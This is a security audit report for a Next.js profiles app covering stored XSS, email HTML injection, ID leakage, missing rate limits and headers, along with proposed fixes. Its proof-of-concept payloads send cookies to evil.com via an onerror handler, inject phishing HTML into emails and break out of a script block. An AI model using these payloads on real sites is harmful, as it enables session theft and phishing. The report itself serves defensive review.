# Security Review — Agentapedia Profiles

**Date:** 2026-03-02
**Scope:** Full codebase audit of `profiles` Next.js app (auth, API routes, RLS policies, client-side, email, infrastructure)

---

## Summary

| Severity | Count |
| -------- | ----- |
| CRITICAL | 2     |
| HIGH     | 2     |
| MEDIUM   | 4     |
| LOW      | 5     |

---

## CRITICAL Findings

### C1 — Stored XSS via Unsanitized HTML Content

**Files:**
- `src/components/ProfileActions.tsx:152` (sends `articleRef.current.innerHTML` to API)
- `src/app/api/profiles/[slug]/content/route.ts:52` (stores raw HTML in database)
- `src/lib/profile-state.ts:89-91` (reads back and renders through `marked`)
- `src/lib/markdown-shared.ts:4` (`marked.parse()` without sanitization)
- `src/components/ProfileActions.tsx:228` (sets `innerHTML` directly from state)

**Attack:**
A claimed profile owner can inject arbitrary HTML/JavaScript into their profile content. The content flows through:

1. Owner edits via `contentEditable` div → `innerHTML` captured
2. Sent to `PUT /api/profiles/{slug}/content` as raw HTML string
3. Stored in `profile_contents.html_content` (only length-checked, not sanitized)
4. On read: converted to markdown via Turndown, then back to HTML via `marked.parse()` (no sanitize option)
5. Rendered to ALL visitors via SSR (`dangerouslySetInnerHTML` pattern in `ProfileActions`)

**Proof of concept payload:**
```html
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
<script>document.location='https://evil.com/phish'</script>
```

Even if `<script>` tags are stripped by the markdown roundtrip, event handler attributes (`onerror`, `onload`, `onfocus`) and `javascript:` URIs survive the Turndown→marked pipeline.

**Impact:** Any visitor to a compromised profile page executes attacker-controlled JavaScript. Session tokens, Clerk auth state, and user data can be exfiltrated.

**Proposed fix:**
1. Install a server-side HTML sanitizer (e.g., `isomorphic-dompurify` or `sanitize-html`)
2. Sanitize content **on write** in `content/route.ts` before storing to database
3. Sanitize content **on read** in `profile-state.ts` before returning `humanContent`
4. Configure `marked` with an allow-list of safe tags: `p, h1-h6, a, strong, em, ul, ol, li, blockquote, pre, code, br, hr, img` (with `img` src restricted to `https://`)
5. Strip all event handler attributes (`on*`) and `javascript:` URIs

```ts
// Proposed: src/lib/sanitize.ts
import createDOMPurify from "isomorphic-dompurify";
const DOMPurify = createDOMPurify();

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ["p", "h1", "h2", "h3", "h4", "h5", "h6", "a", "strong",
      "em", "ul", "ol", "li", "blockquote", "pre", "code", "br", "hr", "img"],
    ALLOWED_ATTR: ["href", "src", "alt", "target", "rel"],
    ALLOW_DATA_ATTR: false,
  });
}
```

---

### C2 — HTML Injection in Verifier Emails (Phishing Vector)

**File:** `src/lib/resend.ts:22-35`

**Attack:**
The email body is constructed via string interpolation with attacker-controlled values:

```ts
html: `
  <p>Hi ${params.verifierName},</p>    // ← user-controlled
  ${params.sectionLabel ? `<p><strong>Section:</strong> ${params.sectionLabel}</p>` : ""}  // ← user-controlled
  <blockquote>${params.snippet}</blockquote>  // ← user-controlled
  <p>Profile URL: <a href="${params.profileUrl}">${params.profileUrl}</a></p>
`
```

A profile owner can submit a verifier request with a crafted `snippet` or `verifierName` like:

```
</blockquote><h1>URGENT: Your account has been compromised</h1><p>Click <a href="https://evil.com/reset">here</a> to reset your password</p><blockquote>
```

**Impact:** Phishing emails sent from your legitimate Resend sender domain with attacker-controlled HTML content. This damages sender reputation and can be used for targeted phishing.

**Proposed fix:**
1. HTML-escape all user-provided values before interpolation:

```ts
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```

2. Apply to every interpolated value in `sendVerifierRequestEmail`:

```ts
html: `
  <p>Hi ${escapeHtml(params.verifierName)},</p>
  ${params.sectionLabel ? `<p><strong>Section:</strong> ${escapeHtml(params.sectionLabel)}</p>` : ""}
  <blockquote>${escapeHtml(params.snippet)}</blockquote>
  ...
`
```

---

## HIGH Findings

### H1 — Clerk User ID (`claimedByUserId`) Leaked to All Users

**Files:**
- `src/lib/profile-state.ts:86,98-99`
- `src/app/api/profiles/[slug]/state/route.ts:14-19`

**Issue:**
The `RuntimeProfileState` object includes `claimedByUserId` (the raw Clerk `user_id`), which is returned by:
- The `GET /api/profiles/{slug}/state` endpoint (accessible to ANY user, including unauthenticated)
- The SSR `initialState` prop passed to `ProfileActions` (embedded in the page HTML)

Clerk user IDs are stable identifiers (e.g., `user_2abc123...`). Exposing them enables:
- User enumeration across profiles
- Cross-referencing with other Clerk-integrated services
- Targeted attacks against specific user accounts

**Proposed fix:**
1. Remove `claimedByUserId` from `RuntimeProfileState` — it is only used to derive `isOwner` (which is already a separate boolean field)
2. If a "claimed by" indicator is needed for the UI, return a non-sensitive boolean like `isClaimed: true` instead
3. Keep `claimedByUserId` in internal server-side logic only

```diff
// profile-state.ts
export interface RuntimeProfileState {
-  claimedByUserId: string | null;
-  claimedAt: string | null;
+  isClaimed: boolean;
   isOwner: boolean;
   // ...
}
```

---

### H2 — Email Spam Abuse via Verifier Endpoint (No Rate Limit)

**File:** `src/app/api/profiles/[slug]/verifiers/route.ts`

**Issue:**
A claimed profile owner can submit unlimited verifier requests to arbitrary email addresses. Each request triggers an email via Resend. There is:
- No rate limiting per user or per profile
- No cap on total verifier requests
- No verification that the target email is a real/consenting verifier
- No cooldown between requests to the same email

Combined with the HTML injection in C2, this creates a powerful email abuse vector.

**Impact:** Reputation damage to your Resend sender domain, potential blacklisting, and targeted phishing at scale.

**Proposed fix:**
1. Add rate limiting: max 5 verifier requests per profile per hour, max 10 per user per day
2. Add a per-email cooldown: no more than 1 email to the same address per profile per 24 hours
3. Consider email verification or CAPTCHA before sending
4. Add an RLS-level or application-level cap on `verifier_requests` rows per slug

---

## MEDIUM Findings

### M1 — No Content Security Policy (CSP) or Security Headers

**File:** `next.config.ts` (no headers configured)

**Issue:**
The application serves no security headers:
- No `Content-Security-Policy` — makes XSS exploitation trivial if any injection point exists
- No `X-Frame-Options` / `frame-ancestors` — allows clickjacking
- No `X-Content-Type-Options: nosniff`
- No `Referrer-Policy`
- No `Permissions-Policy`

**Proposed fix:**
Add security headers in `next.config.ts`:

```ts
const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' https://clerk.accounts.dev",
              "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
              "font-src 'self' https://fonts.gstatic.com",
              "img-src 'self' https: data:",
              "connect-src 'self' https://*.supabase.co https://clerk.accounts.dev",
              "frame-ancestors 'none'",
            ].join("; "),
          },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
        ],
      },
    ];
  },
};
```

The CSP `script-src` directives will need tuning for Clerk's inline scripts, but should be set as strict as possible.

---

### M2 — Supabase Project Reference Committed in `.mcp.json`

**File:** `.mcp.json`

**Issue:**
```json
{
  "mcpServers": {
    "supabase": {
      "type": "http",
      "url": "https://mcp.supabase.com/mcp?project_ref=fqmzpaqefxgxrsvuqjmc"
    }
  }
}
```

The Supabase project reference `fqmzpaqefxgxrsvuqjmc` is committed to the repo. While the `NEXT_PUBLIC_SUPABASE_URL` is expected to be public, the MCP server URL with project ref is a development/admin tool reference that doesn't need to be in version control.

**Proposed fix:**
1. Add `.mcp.json` to `.gitignore`
2. Remove it from tracking: `git rm --cached .mcp.json`
3. Document the MCP setup in CLAUDE.md or a separate setup guide

---

### M3 — Host Header Injection in Email Profile URL

**File:** `src/app/api/profiles/[slug]/verifiers/route.ts:76`

```ts
const baseUrl = process.env.NEXT_PUBLIC_APP_URL ?? new URL(request.url).origin;
```

**Issue:**
If `NEXT_PUBLIC_APP_URL` is not set, the base URL for email links is derived from the request's `Host` header. An attacker can send a request with a spoofed `Host` header to make verifier emails contain links to a phishing domain.

**Proposed fix:**
1. Always require `NEXT_PUBLIC_APP_URL` to be set in production
2. Fail the request if neither env var is available rather than falling back to request origin:

```ts
const baseUrl = process.env.NEXT_PUBLIC_APP_URL;
if (!baseUrl) {
  console.error("NEXT_PUBLIC_APP_URL is not configured");
  // Still insert the verifier request, just skip the email
  throw new Error("Email configuration incomplete");
}
```

---

### M4 — TOCTOU Race Condition in Profile Claiming

**File:** `src/app/api/profiles/[slug]/claim/route.ts:30-51`

**Issue:**
The claim endpoint performs a read-then-write pattern:
1. Check if slug is already claimed (line 30-36)
2. Check if user already claimed another profile (line 37-41)
3. Insert claim (line 52-56)

Between steps 1-2 and step 3, a concurrent request could claim the same slug or the same user could claim another slug. The unique constraints and RLS policies catch this at the DB level (error code `23505`), but:
- The error handling at line 58 catches this gracefully
- However, the app-level checks at lines 43-49 could return misleading error messages during race conditions

**Proposed fix:**
The existing DB constraint + error handling provides adequate safety. For cleaner logic, consider using a single `INSERT ... ON CONFLICT DO NOTHING` pattern and checking the returned row count instead of the read-check-write approach.

---

## LOW Findings

### L1 — `marked` Library Without Explicit Sanitization Config

**File:** `src/lib/markdown-shared.ts:4`

```ts
const rendered = marked.parse(markdown, { async: false });
```

`marked` v17 does not sanitize output by default. While this is primarily exploitable through the stored XSS path (C1), the lack of explicit sanitization configuration is a defense-in-depth gap. Even if HTML sanitization is added elsewhere, `marked` should be configured defensively.

**Proposed fix:** Configure `marked` with a renderer that strips dangerous elements, or pair it with a sanitizer (see C1 fix).

---

### L2 — `console.error` Leaks Resend Error Details

**File:** `src/app/api/profiles/[slug]/verifiers/route.ts:88`

```ts
console.error("Failed to send verifier email", emailError);
```

The full Resend error object (potentially including API key fragments, rate limit details, or internal error messages) is logged to server output. The request still returns 200 success, so the user doesn't know the email failed.

**Proposed fix:**
1. Log only a safe subset: `console.error("Failed to send verifier email:", (emailError as Error).message)`
2. Consider returning a warning to the user that the email may not have been sent

---

### L3 — No Foreign Key on `verifier_requests.slug`

**File:** `supabase/migrations/202603020001_profile_claiming.sql:33-43`

**Issue:**
The `verifier_requests` table has no foreign key constraint on `slug` referencing `profile_claims`. While the RLS policy requires a matching `profile_claims` row for inserts, direct database access (e.g., via Supabase dashboard, migration scripts, or service role key) could create orphaned rows.

**Proposed fix:**
Add a foreign key constraint:

```sql
ALTER TABLE public.verifier_requests
  ADD CONSTRAINT verifier_requests_slug_fk
  FOREIGN KEY (slug) REFERENCES public.profile_claims(slug) ON DELETE CASCADE;
```

---

### L4 — `dangerouslySetInnerHTML` for JSON-LD

**File:** `src/app/[slug]/page.tsx:107-109`

```tsx
<Script
  id="json-ld"
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify(profile.structuredData),
  }}
/>
```

Currently safe because `structuredData` comes from static profile data files. However, if structured data is ever sourced from user input or database content, this becomes a direct XSS vector. A value containing `</script><script>alert(1)</script>` would break out of the JSON-LD script block.

**Proposed fix:**
Escape the JSON string to prevent `</script>` breakout:

```ts
__html: JSON.stringify(profile.structuredData).replace(/</g, "\\u003c")
```

---

### L5 — Email Error Silently Swallowed

**File:** `src/app/api/profiles/[slug]/verifiers/route.ts:75-89`

```ts
try {
  await sendVerifierRequestEmail({ ... });
} catch (emailError) {
  console.error("Failed to send verifier email", emailError);
}
```

The verifier request is saved to the database successfully, but if the email fails, the user receives a success response with no indication the email wasn't sent. The verifier request row exists but the verifier was never notified.

**Proposed fix:**
Return a `warning` field in the response when email delivery fails:

```ts
let emailWarning: string | null = null;
try {
  await sendVerifierRequestEmail({ ... });
} catch {
  emailWarning = "Verifier request saved but email notification failed. The verifier may not have been notified.";
}

const updatedState = await getRuntimeProfileState(slug, userId, accessToken);
return NextResponse.json({ ...updatedState, emailWarning });
```

---

## Positive Security Observations

The following security measures are correctly implemented:

1. **RLS policies are well-structured** — Insert, update, and select policies correctly use `auth.jwt()->>'sub'` to enforce ownership. The dual constraint (app-level + DB-level) provides defense in depth.

2. **Clerk authentication is properly integrated** — All mutation endpoints check both `userId` (from Clerk) and `accessToken` (Supabase JWT). The token resolution fallback in `clerk-token.ts` is reasonable.

3. **Zod validation on API inputs** — Both `content/route.ts` and `verifiers/route.ts` use Zod schemas to validate request bodies before processing.

4. **`.env*` files are gitignored** — The `.gitignore` correctly excludes all env files. No secrets were found in git history.

5. **Supabase client disables session persistence** — `supabase.ts` correctly sets `persistSession: false` and `autoRefreshToken: false` for server-side usage.

6. **CSRF is mitigated by bearer token auth** — API routes use Clerk bearer tokens (not cookies), which inherently prevents CSRF attacks.

7. **External links use `rel="noopener noreferrer"`** — The `normalizeArticleLinks` function and static links correctly set these attributes.

8. **Unique constraints prevent duplicate claims** — Both `slug` and `clerk_user_id` have unique constraints on `profile_claims`, preventing double-claiming at the DB level.

---

## Recommended Priority Order

| Priority | Finding | Effort |
| -------- | ------- | ------ |
| 1        | C1 — Stored XSS (add HTML sanitization) | Medium |
| 2        | C2 — Email HTML injection (escape interpolated values) | Low |
| 3        | H1 — Clerk user ID leakage (remove from public response) | Low |
| 4        | H2 — Email spam abuse (add rate limiting) | Medium |
| 5        | M1 — Security headers / CSP | Medium |
| 6        | M3 — Host header injection in emails | Low |
| 7        | M2 — `.mcp.json` in version control | Low |
| 8        | M4 — TOCTOU in claiming (already mitigated by DB) | Low |
| 9        | L1–L5 — Low findings | Low each |
